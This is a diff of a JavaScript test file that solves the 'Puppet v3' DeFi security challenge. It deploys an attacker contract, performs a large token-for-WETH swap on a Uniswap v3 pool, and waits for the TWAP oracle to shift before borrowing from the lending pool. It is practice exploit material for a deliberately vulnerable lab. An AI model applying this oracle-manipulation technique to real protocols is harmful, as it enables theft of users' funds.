@@ -199,9 +199,7 @@ describe("[Challenge] Puppet v3", function () {
     //DVT-token1="0xdF46e54aAadC1d55198A4a8b4674D7a4c927097A"
     //Swap DVT for ETH - OneForZero
     /**Step1: Deployment */
-    const PuppetV3Attacker = await ethers.getContractFactory(
-      "PuppetV3Attacker"
-    );
+    const PuppetV3Attacker = await ethers.getContractFactory("PV3Attacker");
     const puppetV3Attacker = await PuppetV3Attacker.deploy(
       token.address,
       uniswapPool.address,
@@ -218,118 +216,68 @@ describe("[Challenge] Puppet v3", function () {
         (await token.balanceOf(puppetV3Attacker.address)).toString()
       ),
       "\n____________________________________________________",
-      "\nRepeated swapping token for Weth..."
-    );
-    /** Step2: Repeated swapping with time increments */
-    await puppetV3Attacker.callSwap1(ethers.utils.parseEther("100"), {
-      gasLimit: 3000000,
-    });
-    console.log(
-      ethers.utils.formatEther(
-        (await weth.balanceOf(puppetV3Attacker.address)).toString()
-      )
-    );
-    console.log(
-      ethers.utils.formatEther(
-        (await token.balanceOf(puppetV3Attacker.address)).toString()
-      )
-    );
-    await time.increase(12);
-
-    await puppetV3Attacker.callSwap2(ethers.utils.parseEther("1"), {
-      gasLimit: 3000000,
-    });
-    console.log(
-      ethers.utils.formatEther(
-        (await weth.balanceOf(puppetV3Attacker.address)).toString()
-      )
-    );
-    console.log(
-      ethers.utils.formatEther(
-        (await token.balanceOf(puppetV3Attacker.address)).toString()
-      )
-    );
-    await time.increase(13);
-
-    await puppetV3Attacker.callSwap3(ethers.utils.parseEther("1"), {
-      gasLimit: 3000000,
-    });
-    console.log(
-      ethers.utils.formatEther(
-        (await weth.balanceOf(puppetV3Attacker.address)).toString()
-      )
-    );
-    console.log(
-      ethers.utils.formatEther(
-        (await token.balanceOf(puppetV3Attacker.address)).toString()
-      )
-    );
-    await time.increase(13);
-
-    await puppetV3Attacker.callSwap4(ethers.utils.parseEther("1"), {
-      gasLimit: 3000000,
-    });
-    console.log(
-      ethers.utils.formatEther(
-        (await weth.balanceOf(puppetV3Attacker.address)).toString()
-      )
-    );
-    console.log(
-      ethers.utils.formatEther(
-        (await token.balanceOf(puppetV3Attacker.address)).toString()
-      )
-    );
-    await time.increase(13);
-
-    await puppetV3Attacker.callSwap5(ethers.utils.parseEther("1"), {
-      gasLimit: 3000000,
-    });
-    console.log(
-      ethers.utils.formatEther(
-        (await weth.balanceOf(puppetV3Attacker.address)).toString()
-      )
-    );
-    console.log(
-      ethers.utils.formatEther(
-        (await token.balanceOf(puppetV3Attacker.address)).toString()
-      )
-    );
-    await time.increase(13);
-
-    await puppetV3Attacker.callSwap6(ethers.utils.parseEther("1"), {
-      gasLimit: 3000000,
-    });
-    console.log(
-      ethers.utils.formatEther(
-        (await weth.balanceOf(puppetV3Attacker.address)).toString()
-      )
-    );
-    console.log(
-      ethers.utils.formatEther(
-        (await token.balanceOf(puppetV3Attacker.address)).toString()
-      )
-    );
-    await time.increase(15);
-
-    await puppetV3Attacker.callSwap7(ethers.utils.parseEther("1"), {
-      gasLimit: 3000000,
-    });
-    console.log(
-      ethers.utils.formatEther(
-        (await weth.balanceOf(puppetV3Attacker.address)).toString()
-      )
-    );
-    console.log(
-      ethers.utils.formatEther(
-        (await token.balanceOf(puppetV3Attacker.address)).toString()
-      )
-    );
-    await time.increase(13);
-    await puppetV3Attacker.getQuoteFromPool(LENDING_POOL_INITIAL_TOKEN_BALANCE);
-    amountIn = await puppetV3Attacker.amountIn();
-    console.log(
-      ethers.utils.formatEther(amountIn.toString()),
+      "\nZero for One: false - Swapping token for Weth...",
       "\n____________________________________________________"
+    );
+    /** Step2: swapping with time increments */
+
+    console.log(
+      "current liquidity before swap",
+      (await uniswapPool.liquidity()).toString()
+    );
+    console.log(
+      "current slot0 sqrtpricex96 before swap",
+      (await uniswapPool.slot0())[0].toString()
+    );
+    console.log(
+      "current slot0 tick before swap",
+      (await uniswapPool.slot0())[1].toString()
+    );
+
+    await puppetV3Attacker.callSwap(ethers.utils.parseEther("109"), {
+      gasLimit: 3000000,
+    });
+    console.log(
+      "Attacker Weth Balance after swap",
+      ethers.utils.formatEther(
+        (await weth.balanceOf(puppetV3Attacker.address)).toString()
+      )
+    );
+    console.log(
+      "Attacker Token Balance after swap",
+      ethers.utils.formatEther(
+        (await token.balanceOf(puppetV3Attacker.address)).toString()
+      )
+    );
+    console.log("Current block number", await ethers.provider.getBlockNumber());
+    console.log(
+      "Quote after swap1",
+      ethers.utils.formatEther(
+        await lendingPool.calculateDepositOfWETHRequired(
+          LENDING_POOL_INITIAL_TOKEN_BALANCE
+        )
+      ),
+      "ether",
+      "\n____________________________________________________"
+    );
+
+    await time.increase(100);
+    console.log("Current block number", await ethers.provider.getBlockNumber());
+    console.log(
+      "Quote after 100s",
+      ethers.utils.formatEther(
+        await lendingPool.calculateDepositOfWETHRequired(
+          LENDING_POOL_INITIAL_TOKEN_BALANCE
+        )
+      ),
+      "ether"
+    );
+
+    console.log("current liquidity ", await uniswapPool.liquidity().toString());
+    console.log("current slot0 ", (await uniswapPool.slot0())[0].toString());
+    console.log(
+      "current slot0 tick ",
+      (await uniswapPool.slot0())[1].toString()
     );
 
     /**Step 3: Transfer Weth from attacker contract to player and borrow from pool */
@@ -348,10 +296,15 @@ describe("[Challenge] Puppet v3", function () {
       (await ethers.provider.getBlock("latest")).timestamp -
         initialBlockTimestamp
     );
+    console.log(
+      `current timestamp`,
+      (await ethers.provider.getBlock("latest")).timestamp
+    );
+
     // Check the pool status for references
     await puppetV3Attacker.observePool([600, 0]);
     console.log(
-      "tickCumulatives at 10min agao",
+      "tickCumulatives at 10min ago",
       (await puppetV3Attacker.tickCumulatives(0)).toString()
     );
     console.log(
@@ -372,11 +325,11 @@ describe("[Challenge] Puppet v3", function () {
       )
     );
     //For reference: calculate spot price based on ratio of token balances
-    let x = (await weth.balanceOf(uniswapPool.address)).toString();
-    let y = (await token.balanceOf(uniswapPool.address)).toString();
+    let x = await weth.balanceOf(uniswapPool.address);
+    let y = await token.balanceOf(uniswapPool.address);
     console.log(
       "Ref: Quote of 1million token from lending pool in Weth (based on ratio of token balances):",
-      (1000000 * x) / y
+      (x * 1000000 * 3) / y
     );
   });
 
